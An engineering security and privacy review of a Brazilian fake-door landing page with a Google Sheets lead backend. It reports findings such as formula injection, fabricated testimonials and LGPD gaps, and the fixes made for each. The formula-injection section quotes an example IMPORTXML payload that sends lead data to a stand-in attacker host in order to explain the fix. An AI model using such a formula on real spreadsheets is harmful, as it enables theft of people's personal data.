# Security and Privacy Review

Review conducted September 2026 against the live product. Findings are listed with what was done
about each — including the ones that were not fixed.

**This is not a legal assessment.** It is an engineering review by a non-lawyer. Items flagged
**⚖️ needs legal review** should be taken to a Brazilian lawyer familiar with LGPD and CDC before
the service starts operating commercially.

| #                                                              | Finding                                                     | Severity | Status                         |
| -------------------------------------------------------------- | ----------------------------------------------------------- | -------- | ------------------------------ |
| [F1](#f1--spreadsheet-formula-injection-fixed)                 | Spreadsheet formula injection via form input                | High     | **Fixed**                      |
| [F2](#f2--fabricated-testimonials-on-a-live-commercial-page)   | Fabricated testimonials on a live commercial page           | High     | **Open — owner's decision** ⚖️ |
| [F3](#f3--no-privacy-notice-for-collected-personal-data-fixed) | Personal data collected with no privacy notice              | High     | **Fixed** ⚖️                   |
| [F4](#f4--open-unauthenticated-write-endpoint)                 | Open, unauthenticated write endpoint                        | Medium   | **Mitigated**                  |
| [F5](#f5--user-agent-collected-without-purpose)                | `user_agent` collected with no purpose                      | Medium   | **Fixed**                      |
| [F6](#f6--referenced-og-image-does-not-exist)                  | Referenced OG image does not exist                          | Low      | **Open — needs an asset**      |
| [F7](#f7--structured-data-describes-an-operating-business)     | `LocalBusiness` structured data for a non-operating service | Low      | **Open** ⚖️                    |
| [F8](#f8--lead-data-retention-and-location)                    | No retention policy; data in a personal Drive               | Medium   | **Partly addressed** ⚖️        |

---

## F1 — Spreadsheet formula injection (fixed)

**Severity: High.** The one genuine security vulnerability found.

The original Apps Script wrote form input into the sheet unmodified:

```javascript
sheet.appendRow([
  data.timestamp,
  data.nome, // straight from the form, unmodified
  data.whatsapp,
  // ...
]);
```

Google Sheets evaluates any cell whose content begins with `=`, `+`, `-` or `@`. A submission with
a name like:

```
=IMPORTXML("https://attacker.example/?d="&CONCATENATE(B2:B50),"//x")
```

executes when the sheet is opened — by the owner, with the owner's permissions — and can
exfiltrate the entire lead list, names and phone numbers included, to a URL of the attacker's
choosing. `IMPORTXML`, `IMPORTDATA`, `IMPORTRANGE` and `HYPERLINK` are all viable vectors. It
requires no authentication: the form is public.

The classic CSV/formula-injection class (OWASP), applied to a spreadsheet used as a database.

**Fixed in two layers.** Client-side, `looksLikeFormula` rejects formula-prefixed values in the name
and neighbourhood fields, and `sanitizeForSheet` prefixes anything remaining with a single quote so
the spreadsheet treats it as text. Server-side, the hardened Apps Script in
[backend-setup.md](../backend-setup.md) applies the same escaping independently — the client check
is a UX nicety, the server check is the boundary.

Note the subtlety, which is covered by a test: the check must run against the **raw** string, not a
trimmed one. Trimming removes a leading tab, and a leading tab is itself one of the dangerous
prefixes.

**Action for the owner:** the fix protects new rows. **Existing rows were written before it
existed.** Before opening the sheet again, review the `nome` and `bairro` columns for values
starting with `=`, `+`, `-` or `@`. Nothing in the data seen during this review suggests an
exploit, but it should be checked rather than assumed.

## F2 — Fabricated testimonials on a live commercial page

**Severity: High. Open — the owner has chosen to leave this unchanged for now.**

[`index.html`](../index.html) carries three testimonials with five-star ratings, attributed to
named individuals with São Paulo neighbourhoods and a named club:

> _"Testei a Pure Aero 98 por uma semana antes de comprar..."_ — Rafael M., Pinheiros

`BRIEFING.md` records these as fictional. No one has ever used the service, so no one could have
written them.

**Why this is the most serious item on the list**, above the injection bug that was actually
exploitable:

- **Consumer law.** Brazil's CDC Art. 37 prohibits misleading advertising, including any statement
  capable of inducing the consumer to error about a product or service. Fabricated customer
  testimonials with star ratings on a commercial page charging real prices sit squarely in that
  category. CONAR's advertising code addresses testimonials directly. ⚖️
- **It contaminates the experiment.** Some unknown share of the 38 submissions was influenced by
  social proof for a service with no customers. That effect cannot be measured or removed
  retrospectively — it is now a permanent caveat on the dataset, recorded in
  [results.md](results.md#what-38-reservation-requests-means).
- **It undermines the case study.** The portfolio narrative is honest measurement and honest
  interpretation. A live page carrying invented five-star reviews is the strongest available
  counter-argument to that narrative, and any careful reader who visits the site will find it.

**Options, in order of preference:**

1. **Remove the section.** Zero legal exposure, and the case study can state plainly that social
   proof was removed mid-experiment and note the effect on comparability.
2. **Convert to illustrative scenarios.** Drop the stars and the invented attributions, and label
   the block explicitly as illustrative rather than as customer feedback.
3. **Replace with real quotes** once the pilot has real participants. The best outcome, but it
   requires the pilot to have run.

**Leaving them in place is a decision, and it is recorded here as one** so that it is visible rather
than overlooked. It should be revisited before any paid media runs, since ad platforms have their
own misleading-content policies and the exposure scales with the traffic.

## F3 — No privacy notice for collected personal data (fixed)

**Severity: High.**

The form collected full name, WhatsApp number, neighbourhood and user agent with no privacy notice
anywhere on the site. The footer's _"Privacidade"_ and _"Termos de Uso"_ links both pointed at
`#` — dead. Under LGPD (Lei 13.709/2018), a data subject must be told at minimum who is
controlling their data, for what purpose, on what legal basis, for how long, and how to exercise
their rights.

**Fixed:**

- A privacy notice at [`/privacidade/`](../privacidade/index.html) covering controller, data
  collected, purpose, legal basis, retention, sharing, and how to exercise LGPD rights.
- A consent line directly above the submit button stating the purpose and linking to the notice.
- The dead _"Termos de Uso"_ link removed rather than left pointing nowhere. There are no terms of
  service because no service is being provided; a placeholder would be worse than its absence.

**⚖️ Needs legal review.** The notice is written to be truthful and useful, not to certify
compliance. Specifically requiring professional review: whether legitimate interest or consent is
the correct legal basis here; whether a formal DPO designation is required at this scale; and
whether the retention period stated is defensible. **No claim of LGPD compliance is made anywhere
in this repository** — the notice describes what actually happens to the data, which is the honest
version of the same thing.

## F4 — Open, unauthenticated write endpoint

**Severity: Medium. Mitigated.**

The Apps Script Web App URL is deployed as _"Anyone can access"_ and appears in the page source.
Anyone can POST arbitrary JSON and append rows. Nothing prevented automated submission, and no
abuse has been observed — but a polluted dataset would be difficult to clean and would silently
corrupt the only result the experiment has.

The URL is not a secret and cannot be made one: it is called from the browser, so any value the
page holds is visible to the visitor. Moving it to an environment variable would change nothing
except making it harder to see where it came from. It stays in the source deliberately.

### Endpoint hardening

Applied, in ascending order of cost:

**1. Honeypot field.** A hidden `website` input that people never see and bots routinely fill.
Anything in it means the submission is dropped. The user still gets a success screen — telling a
bot why it failed only helps it retry.

**2. Timing check.** The modal records when it opened; submissions faster than 2.5 seconds are
treated as automated. A person cannot fill five fields that fast; a script does it instantly.

**3. Server-side validation in Apps Script.** The real boundary, since 1 and 2 run in the browser
and are bypassable by anyone reading the source. The hardened `doPost` in
[backend-setup.md](../backend-setup.md) rejects missing required fields, caps field lengths
(preventing a single request from writing megabytes into the sheet), validates urgency against a
known set, caps racket count, and escapes formula prefixes independently of the client.

**4. Duplicate suppression.** The script drops an identical payload arriving within 60 seconds,
which catches double-clicks and naive replay without touching genuine repeat submissions days
apart.

**Deliberately not done: CAPTCHA.** Cloudflare Turnstile would be the correct escalation — free,
privacy-respecting, about ten lines. It is not warranted yet: no abuse has occurred, and every
friction point added to the form suppresses genuine submissions, which is the thing being measured.
The trigger to add it is observed abuse or the start of paid traffic, and the reasoning is recorded
here so the decision is a choice rather than an oversight.

**Not fixable within this architecture: rate limiting by IP.** Apps Script does not expose the
caller's IP. Genuine per-client rate limiting requires an edge function — a Vercel serverless
route in front of the sheet. That is the natural next step if abuse appears, and it is the point at
which this architecture stops being appropriate.

## F5 — `user_agent` collected without purpose

**Severity: Medium. Fixed.**

Every submission stored the full browser user-agent string. It answered no question in the
experiment — GA4 already reports device and browser breakdowns in aggregate — and it added a
fingerprinting-grade field to a table that already contained a name and a phone number.

Under LGPD's data-minimisation principle, personal data collection must be limited to what the
stated purpose requires. This field failed that test simply by never having had a purpose.

**Fixed.** `buildPayload` no longer emits it, and a test asserts it stays gone. The sheet column
remains so historical rows are not disturbed; new rows leave it blank.

**Action for the owner:** consider clearing the existing `user_agent` column. The data has no
analytical value and deleting it strictly reduces exposure.

## F6 — Referenced OG image does not exist

**Severity: Low (reputational and commercial, not a security issue). Open.**

`index.html` declares `og:image` and `twitter:image` pointing at
`https://primeirosaque.com.br/images/og-image.jpg`. **That file has never existed.**

Consequence: every share of this page on WhatsApp, Instagram, LinkedIn or Twitter since April has
rendered as a bare link with no preview image. Given that WhatsApp is the dominant sharing channel
in Brazil and the experiment depends entirely on organic spread, this has plausibly suppressed
reach for the full five months.

**Fix:** create a 1200×630 JPG at `images/og-image.jpg`. The brand assets exist — the wordmark, the
`#DFFF00` on `#131313` palette, and the racket photography — so this is an afternoon's work at
most, and it is the highest-leverage unfixed item in the repository. It is discussed as an
instructive AI failure mode in
[ai-assisted-development.md](ai-assisted-development.md#seo-and-metadata).

## F7 — Structured data describes an operating business

**Severity: Low. Open.** ⚖️

The `LocalBusiness` JSON-LD declares an operating local business in São Paulo with an
`AggregateOffer` priced BRL 250–600. No such business operates.

This is inherent to a fake door rather than a separate deception — the whole page makes that
representation, and the structured data merely restates it in a machine-readable form. It is
recorded because it is a specific, machine-readable, indexed assertion, and because search engines
may surface it as a rich result independently of the page's own qualifying language.

Worth resolving when F2 is resolved; both come down to the same question of how long the door stays
fake. If the pilot proceeds, both become accurate.

## F8 — Lead data retention and location

**Severity: Medium. Partly addressed.** ⚖️

Names and phone numbers of 38 people sit in a Google Sheet in a personal Google Drive account, with
no retention policy, no deletion schedule, no access log, and whatever sharing settings that
spreadsheet happens to carry.

**Addressed:**

- The privacy notice states a retention period and how to request deletion.
- `data/private/` is gitignored, and [`scripts/aggregate.mjs`](../scripts/aggregate.mjs) refuses to
  emit anything personal — the PII guard rejects phone-shaped values, long digit runs, any string
  matching a source name, and the forbidden column names, throwing rather than warning.
- No raw lead data is in git history. Verified against all four commits.

**Still outstanding, for the owner:**

- Confirm the sheet is not shared via link. Check `Share → General access`.
- Confirm the Google account has 2FA enabled.
- Set a calendar reminder to honour the stated retention period. A policy nobody executes is worse
  than no policy, because it is a written promise being broken.
- Decide what happens to these 38 records if the pilot does not proceed. The defensible answer is
  deletion.

## Verified clean

Checked and found to be fine:

- **No secrets in the repository.** The GA4 measurement ID and the Apps Script URL are both public
  by design — they are called from the browser. There are no API keys, tokens or credentials.
- **No personal data in git history.** All four commits inspected.
- **No third-party scripts beyond Google.** GA4, Google Fonts and the Tailwind CDN. No pixels, no
  session recording, no data brokers.
- **No cookies set by the site itself.** GA4 sets its own; disclosed in the privacy notice.
- **Form input is not reflected into the DOM**, so there is no XSS path through the reservation
  flow. Values go into a JSON payload and nowhere else.
- **HTTPS everywhere**, enforced by Vercel.

## Recommended order of action

1. **Create the OG image** (F6). Cheapest fix, largest immediate return, five months overdue.
2. **Audit existing sheet rows** for formula-prefixed values (F1) before opening it again.
3. **Decide on the testimonials** (F2) — required before any paid media.
4. **Clear the `user_agent` column** (F5).
5. **Check the sheet's sharing settings and account 2FA** (F8).
6. **Take the privacy notice to a lawyer** (F3) before the service starts operating commercially.
